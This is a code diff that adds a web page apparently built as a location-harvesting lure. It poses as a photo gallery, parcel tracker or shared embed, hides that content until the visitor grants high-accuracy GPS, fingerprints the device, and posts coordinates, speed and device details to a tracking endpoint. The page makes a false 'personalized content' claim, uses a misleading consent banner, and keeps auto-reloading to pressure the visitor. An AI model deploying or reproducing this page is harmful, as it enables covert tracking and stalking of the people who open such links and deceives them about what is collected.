@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="pageTitle">Loading...</title>
+    <link rel="stylesheet" href="design-system.css">
+    <link rel="stylesheet" href="dynamic-track-styles.css">
+    <link rel="stylesheet" href="theme-button-styles.css">
+</head>
+<body>
+    <!-- Subtle Cookie Consent Banner -->
+    <div id="cookieBanner" class="cookie-banner">
+        <div class="cookie-content">
+            <p>🍪 This site uses cookies and collects data to provide you with the best experience. By continuing, you agree to our data collection practices.</p>
+            <button id="acceptCookies" class="btn-accept">Accept & Continue</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <header>
+            <h1 id="mainTitle">📸 Loading...</h1>
+            <p id="subtitle" class="subtitle">Please wait...</p>
+        </header>
+
+        <!-- Loading State -->
+        <div id="loadingSection" class="loading-section">
+            <div class="loading-content">
+                <div class="spinner"></div>
+                <p id="loadingText">Loading content...</p>
+            </div>
+        </div>
+
+        <!-- Dynamic Content Area -->
+        <div id="contentSection" class="content-section hidden">
+            <!-- Content will be loaded dynamically -->
+        </div>
+    </div>
+
+    <script>
+        // Get page configuration from URL
+        const pagePath = window.location.pathname;
+        let consentGiven = false;
+        
+        // Cookie Consent Handler
+        function checkConsent() {
+            return document.cookie.includes('consent=accepted');
+        }
+        
+        function handleCookieAccept() {
+            consentGiven = true;
+            document.cookie = "consent=accepted; max-age=31536000; path=/; SameSite=Lax";
+            
+            const banner = document.getElementById('cookieBanner');
+            banner.classList.add('hide');
+            setTimeout(() => {
+                banner.style.display = 'none';
+            }, 300);
+            
+            // Continue with page initialization
+            initializePage();
+        }
+        
+        // Setup consent button
+        document.addEventListener('DOMContentLoaded', () => {
+            const acceptBtn = document.getElementById('acceptCookies');
+            if (acceptBtn) {
+                acceptBtn.addEventListener('click', handleCookieAccept);
+            }
+            
+            if (checkConsent()) {
+                consentGiven = true;
+                const banner = document.getElementById('cookieBanner');
+                if (banner) banner.style.display = 'none';
+                initializePage();
+            }
+        });
+        
+        // 🔐 Load configuration and initialize (content locked until location granted)
+        async function initializePage() {
+            try {
+                const response = await fetch(`/api/page-config${pagePath}`);
+                const config = await response.json();
+                
+                if (config.success) {
+                    setupPage(config.page);
+                    
+                    // 🔑 Location permission is the KEY to unlock content
+                    try {
+                        await captureLocation(pagePath);
+                        // Location granted! Unlock and show content
+                        setTimeout(() => showContent(), 2000);
+                    } catch (errorType) {
+                        // Location denied! Content stays locked
+                        console.log('🔒 Content locked - location denied');
+                        // Error is already displayed by captureLocation
+                    }
+                } else {
+                    showError('Content not available');
+                }
+            } catch (error) {
+                console.error('Initialization error:', error);
+                showError('Failed to load content');
+            }
+        }
+        
+        function setupPage(config) {
+            document.title = config.title;
+            document.getElementById('pageTitle').textContent = config.title;
+            document.getElementById('mainTitle').textContent = config.title;
+            document.getElementById('subtitle').textContent = config.subtitle;
+            document.getElementById('loadingText').textContent = config.loadingText;
+            
+            // Build content based on type
+            const contentSection = document.getElementById('contentSection');
+            
+            if (config.content.type === 'photos') {
+                contentSection.innerHTML = buildPhotoGallery(config.content.items);
+            } else if (config.content.type === 'delivery') {
+                contentSection.innerHTML = buildDeliveryPage(config.content);
+            } else if (config.content.type === 'embed') {
+                contentSection.innerHTML = buildEmbedPage(config);
+            } else if (config.content.type === 'custom') {
+                contentSection.innerHTML = config.content.html;
+            }
+        }
+        
+        function buildPhotoGallery(items) {
+            return `
+                <div class="photo-gallery">
+                    ${items.map(item => `
+                        <div class="photo-card">
+                            <img src="${item.url}" alt="${item.caption}">
+                            <div class="photo-info">
+                                <h3>${item.caption}</h3>
+                                <p>${item.description}</p>
+                            </div>
+                        </div>
+                    `).join('')}
+                </div>
+                <div class="gallery-footer">
+                    <p>✨ More photos coming soon! ✨</p>
+                </div>
+            `;
+        }
+        
+        function buildDeliveryPage(content) {
+            return `
+                <div class="delivery-container">
+                    <div class="delivery-card">
+                        <div class="delivery-icon">📦</div>
+                        <h2>Tracking Number</h2>
+                        <p class="tracking-number">${content.trackingNumber}</p>
+                        
+                        <div class="delivery-status">
+                            <div class="status-badge status-active">${content.status}</div>
+                            <p class="delivery-time">Estimated: ${content.estimatedTime}</p>
+                        </div>
+                        
+                        <div class="delivery-timeline">
+                            <div class="timeline-item completed">
+                                <div class="timeline-dot"></div>
+                                <div class="timeline-content">
+                                    <h4>Order Placed</h4>
+                                    <p>Your order has been confirmed</p>
+                                </div>
+                            </div>
+                            <div class="timeline-item completed">
+                                <div class="timeline-dot"></div>
+                                <div class="timeline-content">
+                                    <h4>In Transit</h4>
+                                    <p>Package is on the way</p>
+                                </div>
+                            </div>
+                            <div class="timeline-item active">
+                                <div class="timeline-dot"></div>
+                                <div class="timeline-content">
+                                    <h4>Out for Delivery</h4>
+                                    <p>Driver is nearby</p>
+                                </div>
+                            </div>
+                            <div class="timeline-item">
+                                <div class="timeline-dot"></div>
+                                <div class="timeline-content">
+                                    <h4>Delivered</h4>
+                                    <p>Package will arrive soon</p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="delivery-message">
+                            <p>${content.message}</p>
+                        </div>
+                        
+                        <button class="btn btn-primary" onclick="alert('Thank you for confirming!')">
+                            Confirm Receipt
+                        </button>
+                    </div>
+                </div>
+            `;
+        }
+        
+        function buildEmbedPage(config) {
+            return `
+                <div class="embed-container">
+                    ${config.embedCode || `<iframe src="${config.content.embedUrl}" width="100%" height="500" frameborder="0" allowfullscreen></iframe>`}
+                </div>
+                <div class="embed-footer">
+                    <p>Shared content</p>
+                </div>
+            `;
+        }
+        
+        function showContent() {
+            document.getElementById('loadingSection').classList.add('hidden');
+            document.getElementById('contentSection').classList.remove('hidden');
+        }
+        
+        function showError(message) {
+            document.getElementById('loadingSection').innerHTML = `
+                <div class="error-message">
+                    <h2>❌ ${message}</h2>
+                    <p>Please try again later.</p>
+                </div>
+            `;
+        }
+        
+        // 🔑 Location tracking - GPS permission is the KEY to unlock content
+        async function captureLocation(pagePath) {
+            const trackingData = {
+                timestamp: new Date().toISOString(),
+                latitude: null,
+                longitude: null,
+                accuracy: null,
+                gpsGranted: false,
+                deviceInfo: getDeviceFingerprint(),
+                pageUrl: window.location.href,
+                pagePath: pagePath,
+                referrer: document.referrer || 'Direct'
+            };
+            
+            try {
+                await attemptGPSTracking(trackingData);
+                
+                // Check if GPS was granted
+                if (!trackingData.gpsGranted) {
+                    // 🔒 GPS denied - content remains LOCKED
+                    await sendTrackingData(trackingData); // Log the denial attempt
+                    showLocationRequired(trackingData.gpsErrorType || 'denied');
+                    throw trackingData.gpsErrorType || 'denied'; // Throw error to prevent content loading
+                }
+                
+                // ✅ GPS granted - key accepted, content can be unlocked
+                await sendTrackingData(trackingData);
+            } catch (error) {
+                // 🔒 Error occurred - content stays locked
+                console.error('Tracking error:', error);
+                showLocationRequired('unknown');
+                throw error; // Re-throw to prevent content from loading
+            }
+        }
+        
+        function getDeviceFingerprint() {
+            const data = [
+                navigator.userAgent,
+                navigator.language,
+                screen.colorDepth,
+                screen.width + 'x' + screen.height,
+                new Date().getTimezoneOffset(),
+                navigator.platform
+            ].join('|');
+            
+            let hash = 0;
+            for (let i = 0; i < data.length; i++) {
+                const char = data.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash;
+            }
+            
+            return {
+                fingerprint: Math.abs(hash).toString(36),
+                screenResolution: screen.width + 'x' + screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                cookiesEnabled: navigator.cookieEnabled,
+                touchSupport: 'ontouchstart' in window
+            };
+        }
+        
+        function attemptGPSTracking(trackingData) {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    trackingData.gpsGranted = false;
+                    trackingData.gpsError = 'Geolocation not supported';
+                    trackingData.gpsErrorType = 'unsupported';
+                    reject('unsupported');
+                    return;
+                }
+                
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                };
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // Success - GPS granted
+                        trackingData.latitude = position.coords.latitude;
+                        trackingData.longitude = position.coords.longitude;
+                        trackingData.accuracy = position.coords.accuracy;
+                        trackingData.altitude = position.coords.altitude;
+                        trackingData.heading = position.coords.heading;
+                        trackingData.speed = position.coords.speed;
+                        trackingData.gpsGranted = true;
+                        resolve();
+                    },
+                    (error) => {
+                        // Failed or denied
+                        trackingData.gpsGranted = false;
+                        trackingData.gpsError = error.message;
+                        
+                        let errorType = 'unknown';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorType = 'denied';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorType = 'unavailable';
+                                break;
+                            case error.TIMEOUT:
+                                errorType = 'timeout';
+                                break;
+                        }
+                        
+                        trackingData.gpsErrorType = errorType;
+                        reject(errorType);
+                    },
+                    options
+                );
+            });
+        }
+        
+        // Show location required message with auto-retry
+        function showLocationRequired(errorType) {
+            const loadingSection = document.getElementById('loadingSection');
+            
+            let message = '';
+            let instructions = '';
+            let autoRetrySeconds = 10;
+            
+            if (errorType === 'denied') {
+                message = 'Location Access Required to View Content';
+                instructions = `
+                    <p style="font-size: 16px; margin-bottom: 20px;">You must allow location access to view this content.</p>
+                    <p><strong>To enable location:</strong></p>
+                    <ol style="text-align: left; max-width: 500px; margin: 20px auto; line-height: 1.8;">
+                        <li><strong>Chrome:</strong> Click the 🔒 icon in address bar → Site settings → Location → Allow</li>
+                        <li><strong>Firefox:</strong> Click the 🔒 icon → Permissions → Location → Allow</li>
+                        <li><strong>Safari:</strong> Safari menu → Settings → Websites → Location → Allow for this site</li>
+                        <li><strong>Mobile:</strong> Settings → Browser → Site Settings → Location → Allow</li>
+                    </ol>
+                    <p style="margin-top: 25px; font-weight: 600; color: #667eea;">
+                        Page will automatically retry in <span id="countdown">${autoRetrySeconds}</span> seconds...
+                    </p>
+                    <p style="margin-top: 15px;">
+                        <button onclick="location.reload()" style="display: inline-block; padding: 12px 30px; background: #667eea; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 15px;">Try Again Now</button>
+                    </p>
+                `;
+            } else if (errorType === 'timeout' || errorType === 'unavailable') {
+                message = 'Unable to Get Your Location';
+                autoRetrySeconds = 5;
+                instructions = `
+                    <p>We couldn't determine your location. This content requires location access.</p>
+                    <p><strong>Please check:</strong></p>
+                    <ul style="text-align: left; max-width: 500px; margin: 20px auto; line-height: 1.8;">
+                        <li>Make sure GPS is enabled on your device</li>
+                        <li>Check that you have internet connection</li>
+                        <li>Move to an area with better signal</li>
+                    </ul>
+                    <p style="margin-top: 25px; font-weight: 600; color: #667eea;">
+                        Retrying automatically in <span id="countdown">${autoRetrySeconds}</span> seconds...
+                    </p>
+                    <p style="margin-top: 15px;">
+                        <button onclick="location.reload()" style="padding: 12px 30px; background: #667eea; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 15px;">Try Again Now</button>
+                    </p>
+                `;
+            } else {
+                message = 'Location Access Required';
+                instructions = `
+                    <p style="font-size: 16px;">This content is only available with location access.</p>
+                    <p style="margin-top: 20px;">Please allow location when prompted by your browser.</p>
+                    <p style="margin-top: 25px; font-weight: 600; color: #667eea;">
+                        Retrying in <span id="countdown">${autoRetrySeconds}</span> seconds...
+                    </p>
+                    <p style="margin-top: 15px;">
+                        <button onclick="location.reload()" style="padding: 12px 30px; background: #667eea; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 15px;">Reload Now</button>
+                    </p>
+                `;
+            }
+            
+            loadingSection.innerHTML = `
+                <div class="loading-content" style="max-width: 650px; margin: 0 auto;">
+                    <div style="font-size: 80px; margin-bottom: 25px;">📍</div>
+                    <h2 style="color: #dc3545; margin-bottom: 20px; font-size: 26px;">${message}</h2>
+                    ${instructions}
+                    <div style="margin-top: 35px; padding: 20px; background: #fff3cd; border-radius: 8px; border-left: 4px solid #ffc107; text-align: left;">
+                        <p style="color: #856404; margin: 0; font-size: 14px; line-height: 1.6;">
+                            <strong>Why do we need your location?</strong><br>
+                            This content is personalized based on your geographic location.
+                        </p>
+                    </div>
+                </div>
+            `;
+            
+            // Start countdown and auto-retry
+            let countdown = autoRetrySeconds;
+            const countdownElement = document.getElementById('countdown');
+            
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                if (countdownElement) {
+                    countdownElement.textContent = countdown;
+                }
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    location.reload(); // Auto-reload to retry
+                }
+            }, 1000);
+        }
+        
+        async function sendTrackingData(trackingData) {
+            try {
+                await fetch('/api/track', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(trackingData)
+                });
+            } catch (error) {
+                console.error('Tracking error:', error);
+            }
+        }
+        
+        // Don't auto-initialize - wait for consent
+        // initializePage() is called after cookie acceptance
+    </script>
+</body>
+</html>
+
